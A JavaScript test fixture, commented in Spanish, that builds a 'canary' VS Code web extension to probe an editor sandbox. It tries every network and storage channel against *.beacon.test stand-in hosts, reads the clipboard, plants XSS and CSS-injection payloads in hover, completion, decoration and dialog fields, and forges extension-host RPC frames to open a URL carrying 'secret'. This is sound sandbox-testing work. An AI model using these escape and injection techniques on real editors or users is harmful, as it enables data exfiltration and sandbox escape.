// La extensión canario del nivel 2 (parte B2): intenta salir por todos los
// canales que tiene una extensión y deja el resultado de cada intento.
//
//   · canary.run(port): cada canal de red y de almacenamiento del worker
//     (también fuentes con FontFace, Cache Storage y WebSocketStream), con
//     nombres *.test únicos (la baliza los recibe si algo sale);
//   · el «fuzzer» de campos: al activarse registra hover, autocompletado,
//     firmas, acciones de código, diagnósticos y decoraciones con imágenes,
//     enlaces, HTML, inyecciones de CSS, URIs javascript: y command: e iconos
//     remotos en cada campo;
//   · canary.ui: aviso, aviso modal, selector y cuadro de texto con lo mismo;
//   · canary.edit: mete texto hostil en el documento activo (puerta de la
//     vista previa); canary.clip: escribe en el portapapeles;
//   · canary.open(url): openExternal (fase B: una sola visita, la aceptada);
//   · canary.forge: tramas RPC hechas a mano por MessagePort.prototype
//     ($openUri, dispose, una webview y un actor que no existe).
const base = { name: 'canary', publisher: 'elffuss-test', version: '2.0.0', displayName: 'X2 canary (full)', license: 'MIT', engines: { vscode: '^1.80.0' }, browser: './extension.js' };

export const CANARY_FULL = {
  manifest: {
    ...base,
    activationEvents: ['*'],
    contributes: {
      commands: ['run', 'report', 'ui', 'edit', 'clip', 'open', 'forge'].map(c => ({ command: 'canary.' + c, title: 'Canary ' + c, category: 'X2' })),
    },
  },
  files: {
    'extension.js': String.raw`const vscode = require('vscode');
const results = [];
const B = (n, scheme) => (scheme || 'http') + '://' + n + '.beacon.test/x2-canary/' + n;
const tryIt = async (channel, fn) => {
  try { const r = await fn(); results.push({ channel, outcome: 'ALLOWED', detail: String(r).slice(0, 200) }); }
  catch (e) { results.push({ channel, outcome: 'blocked', detail: String(e && (e.message || e)).slice(0, 200) }); }
};
const timeout = (ms, what) => new Promise((_, rej) => setTimeout(() => rej(new Error(what + ' timed out')), ms));
const HOSTILE = '**canary** ![i](http://md-img.beacon.test/i.png) ![j](https://md-img2.beacon.test/j.png) [l](https://md-link.beacon.test/l) ' +
  '<img src="http://md-html.beacon.test/h.png"> <a href="https://md-a.beacon.test/">a</a> <style>@import url(http://md-css.beacon.test/s.css)</style> ' +
  'https://md-auto.beacon.test/auto [c](command:workbench.action.reloadWindow) [j](javascript:alert(1)) <svg onload="fetch(\'http://md-svg.beacon.test/\')">';
const mdHostile = () => { const m = new vscode.MarkdownString(HOSTILE); m.isTrusted = true; m.supportHtml = true; m.supportThemeIcons = true; return m; };

async function run(codePort, sandboxPort) {
  results.length = 0;
  await tryIt('fetch-http', () => fetch(B('fetch'), { mode: 'no-cors' }).then(r => r.type));
  await tryIt('fetch-https', () => fetch(B('fetchs', 'https'), { mode: 'no-cors' }).then(r => r.type));
  await tryIt('fetch-request', () => fetch(new Request(B('request'), { mode: 'no-cors', credentials: 'include' })).then(r => r.type));
  await tryIt('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', B('xhr')); x.onload = () => res(x.status); x.onerror = () => rej(new Error('xhr error')); x.send(); }));
  await tryIt('sendBeacon', () => { if (!self.navigator.sendBeacon) throw new Error('no sendBeacon'); return self.navigator.sendBeacon(B('beacon'), 'x'); });
  await tryIt('fetchLater', () => { if (typeof fetchLater !== 'function') throw new Error('no fetchLater'); return fetchLater(B('later')); });
  await tryIt('websocket', () => Promise.race([new Promise((res, rej) => { const w = new WebSocket(B('ws', 'ws')); w.onopen = () => res('open'); w.onerror = () => rej(new Error('ws error')); }), timeout(3000, 'ws')]));
  await tryIt('websocket-tls', () => Promise.race([new Promise((res, rej) => { const w = new WebSocket(B('wss', 'wss')); w.onopen = () => res('open'); w.onerror = () => rej(new Error('wss error')); }), timeout(3000, 'wss')]));
  await tryIt('eventsource', () => Promise.race([new Promise((res, rej) => { if (!self.EventSource) return rej(new Error('no EventSource')); const s = new EventSource(B('sse')); s.onopen = () => res('open'); s.onerror = () => { s.close(); rej(new Error('sse error')); }; }), timeout(3000, 'sse')]));
  await tryIt('webtransport', () => { if (typeof WebTransport !== 'function') throw new Error('no WebTransport'); const t = new WebTransport(B('wt', 'https')); t.closed.catch(() => {}); return Promise.race([t.ready.then(() => 'ready'), timeout(3000, 'wt')]); });
  await tryIt('import', () => import(B('import')));
  await tryIt('importScripts', () => importScripts(B('importscripts')));
  await tryIt('worker-url', () => new Promise((res, rej) => { try { const w = new Worker(B('worker')); w.onerror = ev => { try { ev.preventDefault(); } catch (x) { /* — */ } rej(new Error('worker error')); }; setTimeout(() => res('created'), 1000); } catch (e) { rej(e); } }));
  await tryIt('worker-blob-fetch', () => new Promise((res, rej) => {
    try {
      const src = 'fetch(' + JSON.stringify(B('nested')) + ',{mode:"no-cors"}).then(r=>postMessage("ALLOWED "+r.type),e=>postMessage("blocked "+e.message))';
      const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
      w.onmessage = e => (String(e.data).startsWith('ALLOWED') ? res(e.data) : rej(new Error(e.data)));
      w.onerror = ev => { try { ev.preventDefault(); } catch (x) { /* — */ } rej(new Error('nested worker error')); };
      setTimeout(() => rej(new Error('nested worker silent')), 3000);
    } catch (e) { rej(e); }
  }));
  await tryIt('webrtc', () => { if (typeof RTCPeerConnection === 'undefined') throw new Error('no RTCPeerConnection'); return new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.beacon.test:3478' }] }); });
  await tryIt('websocketstream', () => { if (typeof WebSocketStream !== 'function') throw new Error('no WebSocketStream'); const w = new WebSocketStream(B('wsstream', 'ws')); return Promise.race([w.opened.then(() => 'open'), timeout(3000, 'wsstream')]); });
  await tryIt('fontface', () => { if (typeof FontFace !== 'function' || !self.fonts) throw new Error('no FontFace in a worker'); const f = new FontFace('canary', 'url(' + B('font') + ')'); self.fonts.add(f); return Promise.race([f.load().then(() => 'loaded'), timeout(3000, 'font')]); });
  await tryIt('caches-add', async () => { if (!self.caches) throw new Error('no caches'); const c = await caches.open('canary'); await c.add(B('cacheadd')); return 'added'; });
  await tryIt('open-vsx', () => fetch('https://open-vsx.org/api/-/search?query=x2-canary-leak', { mode: 'no-cors' }).then(r => r.type));
  await tryIt('code-server', () => fetch('http://127.0.0.1:' + codePort + '/js/main.js?x2-canary-leak=1', { mode: 'no-cors' }).then(r => r.type));
  await tryIt('sandbox-host', () => fetch('http://localhost:' + sandboxPort + '/x2/v1/sandbox.html?x2-canary-leak=1', { mode: 'no-cors' }).then(r => r.type));
  await tryIt('indexedDB', () => (indexedDB.databases ? indexedDB.databases() : Promise.resolve([])).then(d => { const names = d.map(x => x.name); if (names.some(n => /elffuss|canary/.test(n))) throw new Error('SAW CODE STORAGE: ' + names.join(',')); return 'own: ' + names.join(','); }));
  await tryIt('opfs', async () => { const root = await navigator.storage.getDirectory(); const names = []; for await (const k of root.keys()) names.push(k); if (names.some(n => /canary|\.js$|\.txt$|\.html$/.test(n))) throw new Error('SAW CODE OPFS: ' + names.join(',')); return 'own: ' + names.join(','); });
  await tryIt('localStorage', () => { if (typeof localStorage === 'undefined') return 'own: none in a worker'; const v = localStorage.getItem('elffuss-canary'); if (v) throw new Error('SAW CODE localStorage'); return 'own: empty'; });
  await tryIt('cookie', () => { const c = typeof document !== 'undefined' ? document.cookie : ''; if (/elffuss_canary/.test(c)) throw new Error('SAW CODE COOKIE'); return 'own: none'; });
  await tryIt('caches', async () => { if (!self.caches) return 'own: no caches'; const k = await caches.keys(); return 'own: ' + k.join(','); });
  await tryIt('clipboard-navigator', async () => { if (!navigator.clipboard) throw new Error('no clipboard'); return navigator.clipboard.readText(); });
  await tryIt('clipboard-api', () => vscode.env.clipboard.readText().then(t => { if (t) throw new Error('READ ' + t.length + ' chars'); return 'own: read 0 chars'; }));
  await tryIt('fs-http', () => vscode.workspace.fs.readFile(vscode.Uri.parse(B('fs'))).then(b => b.length));
  await tryIt('openTextDocument-http', () => vscode.workspace.openTextDocument(vscode.Uri.parse(B('doc'))).then(d => d.getText().length));
  await tryIt('asExternalUri', () => vscode.env.asExternalUri(vscode.Uri.parse(B('asexternal'))).then(u => 'own: unchanged ' + (u.toString() === vscode.Uri.parse(B('asexternal')).toString())));
  await tryIt('openExternal', () => vscode.env.openExternal(vscode.Uri.parse(B('open'))).then(ok => { if (ok) throw new Error('OPENED'); return 'own: refused'; }));
  await tryIt('saveAll', () => vscode.workspace.saveAll());
  return results;
}

// ── el fuzzer de campos: todo lo que la página pinta, con veneno ──
function registerFuzzer(context) {
  const sel = [{ language: 'javascript' }, { language: 'html' }, { language: 'plaintext' }];
  context.subscriptions.push(
    vscode.languages.registerHoverProvider(sel, { provideHover() { return new vscode.Hover([mdHostile(), 'plain <img src="http://hover-str.beacon.test/s.png">']); } }),
    vscode.languages.registerCompletionItemProvider(sel, {
      provideCompletionItems() {
        const it = new vscode.CompletionItem('zzcanary<img src=x onerror=alert(1)>', vscode.CompletionItemKind.Text);
        it.filterText = 'zzcanary'; it.sortText = '!'; it.preselect = true;
        it.documentation = mdHostile();
        it.detail = 'detail <img src="http://detail.beacon.test/d.png">';
        it.insertText = new vscode.SnippetString('canary \${CLIPBOARD} \${1:x}');
        it.command = { command: 'canary.open', title: 'open', arguments: [B('completioncmd')] };
        return [it];
      },
    }, '.'),
    vscode.languages.registerSignatureHelpProvider(sel, {
      provideSignatureHelp() {
        const s = new vscode.SignatureInformation('canary(a, b)', mdHostile());
        s.parameters = [new vscode.ParameterInformation('a', mdHostile())];
        const h = new vscode.SignatureHelp(); h.signatures = [s]; h.activeSignature = 0; h.activeParameter = 0; return h;
      },
    }, '(', ','),
    vscode.languages.registerCodeActionsProvider(sel, {
      provideCodeActions() {
        const a = new vscode.CodeAction('Canary <b>fix</b> ![i](http://action.beacon.test/i.png)', vscode.CodeActionKind.QuickFix);
        a.command = { command: 'canary.open', title: 'open', arguments: [B('actioncmd')] };
        return [a];
      },
    }),
  );
  const diags = vscode.languages.createDiagnosticCollection('canary');
  context.subscriptions.push(diags);
  const deco = vscode.window.createTextEditorDecorationType({
    backgroundColor: 'url(http://deco-bg.beacon.test/a.png)', color: 'red; background-image: url(http://deco-inj.beacon.test/b.png)',
    border: '1px solid red; background: url(http://deco-border.beacon.test/c.png)', textDecoration: 'none; background:url(http://deco-td.beacon.test/d.png)',
    fontFamily: 'x; src: url(http://deco-font.beacon.test/f.woff)', cursor: 'url(http://deco-cursor.beacon.test/e.png), auto',
    gutterIconPath: vscode.Uri.parse('http://deco-gutter.beacon.test/g.png'),
    before: { contentText: 'canary\\"; background: url(http://deco-content.beacon.test/h.png)', contentIconPath: vscode.Uri.parse('http://deco-icon.beacon.test/i.png') },
  });
  context.subscriptions.push(deco);
  const paint = ed => {
    if (!ed) return;
    const d = ed.document;
    const dg = new vscode.Diagnostic(new vscode.Range(0, 0, 0, 1), 'canary ![i](http://diag.beacon.test/i.png) <img src="http://diag-html.beacon.test/h.png">', vscode.DiagnosticSeverity.Warning);
    dg.code = { value: 'CANARY', target: vscode.Uri.parse(B('diagcode')) };
    dg.relatedInformation = [new vscode.DiagnosticRelatedInformation(new vscode.Location(vscode.Uri.parse(B('related')), new vscode.Position(0, 0)), 'related ![i](http://related.beacon.test/r.png)')];
    diags.set(d.uri, [dg]);
    const ranges = [];
    for (let i = 0; i < Math.min(d.lineCount, 50); i++) ranges.push({ range: new vscode.Range(i, 0, i, 1), hoverMessage: mdHostile(),
      renderOptions: { after: { contentText: 'x', color: 'url(http://deco-ro.beacon.test/r.png)' } } });
    ed.setDecorations(deco, ranges);
  };
  paint(vscode.window.activeTextEditor);
  context.subscriptions.push(vscode.window.onDidChangeActiveTextEditor(paint));
}

// ── tramas RPC hechas a mano ──
// Se observa por qué puerto y con qué rpcId salen las llamadas legítimas de
// este mismo worker, y luego se mandan tramas propias por ese puerto.
const seen = new Map();                                    // método → rpcId
let rpcPort = null, nativePost = null;
function watchFrames() {
  if (nativePost) return;
  nativePost = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function (data, transfer) {
    try {
      if (data instanceof ArrayBuffer && data.byteLength > 7) {
        const b = new Uint8Array(data);
        if (b[0] === 1 || b[0] === 2 || b[0] === 3 || b[0] === 4) {
          const rpcId = b[5], len = b[6];
          const method = new TextDecoder().decode(b.subarray(7, 7 + len));
          if (!seen.has(method)) seen.set(method, rpcId);
          rpcPort = this;
        }
      }
    } catch (e) { /* — */ }
    return nativePost.call(this, data, transfer);
  };
}
function frame(req, rpcId, method, argsJson) {
  const enc = new TextEncoder();
  const m = enc.encode(method), a = enc.encode(argsJson);
  const buf = new Uint8Array(1 + 4 + 1 + 1 + m.length + 4 + a.length);
  const v = new DataView(buf.buffer);
  let o = 0;
  buf[o++] = 1; v.setUint32(o, req); o += 4; buf[o++] = rpcId; buf[o++] = m.length; buf.set(m, o); o += m.length;
  v.setUint32(o, a.length); o += 4; buf.set(a, o);
  return buf.buffer;
}
async function forge() {
  // llamadas legítimas para aprender los rpcId de MainThreadCommands, MainThreadWindow y MainThreadWebviewPanels
  const tmp = vscode.commands.registerCommand('canary.tmp' + Date.now(), () => 0); tmp.dispose();
  try { const p = vscode.window.createWebviewPanel('canary', 'canary', vscode.ViewColumn.One, {}); p.dispose(); } catch (e) { /* — */ }
  await new Promise(r => setTimeout(r, 300));
  const out = { learned: Object.fromEntries(seen), sent: [] };
  if (!rpcPort) { out.error = 'no port seen'; return out; }
  let req = 0x7fff0000;
  const send = (rpcId, method, args) => { nativePost.call(rpcPort, frame(req++, rpcId, method, JSON.stringify(args)), []); out.sent.push(method + '@' + rpcId); };
  if (seen.has('$registerCommand')) send(seen.get('$registerCommand'), 'dispose', []);
  if (seen.has('$createWebviewPanel')) send(seen.get('$createWebviewPanel'), '$createWebviewPanel', []);
  if (seen.has('$unregisterCommand')) send(seen.get('$unregisterCommand'), 'constructor', []);
  send(250, '$anything', []);
  const forgedUrl = 'https://forged.beacon.test/rpc?d=secret';
  if (seen.has('$openUri')) send(seen.get('$openUri'), '$openUri', [{ $mid: 1, scheme: 'https', authority: 'forged.beacon.test', path: '/rpc', query: 'd=secret' }, forgedUrl, {}]);
  out.forgedUrl = forgedUrl;
  return out;
}

exports.activate = function (context) {
  watchFrames();
  registerFuzzer(context);
  const reg = (id, fn) => context.subscriptions.push(vscode.commands.registerCommand(id, fn));
  reg('canary.run', async (codePort, sandboxPort) => JSON.stringify(await run(Number(codePort) || 80, Number(sandboxPort) || 80)));
  reg('canary.report', () => JSON.stringify(results));
  reg('canary.ui', async () => {
    const out = {};
    out.info = await vscode.window.showInformationMessage('canary toast ' + HOSTILE, 'Open <b>it</b>', 'command:workbench.action.reloadWindow');
    out.modal = await vscode.window.showWarningMessage('canary modal <img src="http://modal.beacon.test/m.png">', { modal: true, detail: HOSTILE }, 'OK');
    out.pick = await vscode.window.showQuickPick([
      { label: '$(globe) canary <img src="http://pick.beacon.test/p.png">', description: '[d](https://pick-d.beacon.test/)', detail: HOSTILE, iconPath: vscode.Uri.parse('http://pick-icon.beacon.test/i.png') },
      { label: 'second' }], { placeHolder: 'canary <b>pick</b>' });
    out.input = await vscode.window.showInputBox({ prompt: 'canary ' + HOSTILE, value: 'x' });
    await vscode.window.withProgress({ location: vscode.ProgressLocation.Notification, title: 'canary ![p](http://progress.beacon.test/p.png)' }, async p => { p.report({ message: '[m](https://progress-m.beacon.test/)' }); });
    return JSON.stringify(out);
  });
  reg('canary.edit', async () => {
    const ed = vscode.window.activeTextEditor;
    if (!ed) return 'no-editor';
    const end = ed.document.lineAt(ed.document.lineCount - 1).range.end;
    await ed.edit(b => b.insert(end, '\n<img src="http://preview.beacon.test/p.png"><script>fetch("http://preview-script.beacon.test/")</script>\n'));
    return 'edited';
  });
  reg('canary.clip', async () => { await vscode.env.clipboard.writeText('canary clipboard'); return 'written'; });
  reg('canary.open', async url => String(await vscode.env.openExternal(vscode.Uri.parse(String(url)))));
  reg('canary.forge', async () => JSON.stringify(await forge()));
};
`,
  },
};
